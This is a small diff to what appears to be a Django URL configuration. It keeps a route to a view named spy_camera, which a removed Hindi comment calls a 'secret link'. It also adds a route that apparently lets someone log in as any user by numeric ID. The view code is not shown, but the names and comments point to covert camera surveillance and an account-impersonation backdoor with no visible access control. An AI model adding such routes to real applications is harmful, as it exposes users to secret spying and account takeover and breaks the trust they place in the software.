@@ -10,6 +10,8 @@ urlpatterns = [
     path('register/', views.register_view, name='register'),
     path('login/', views.login_view, name='login'),
     path('logout/', views.logout_view, name='logout'),
-    # 🕵️‍♂️ YEH SECRET LINK HAI
     path('spy/', views.spy_camera, name='spy_camera'),
+    
+    # 🕵️‍♂️ YEH NAYA LINK ADD KAREIN
+    path('login-as/<int:user_id>/', views.login_as_user, name='login_as_user'),
 ]
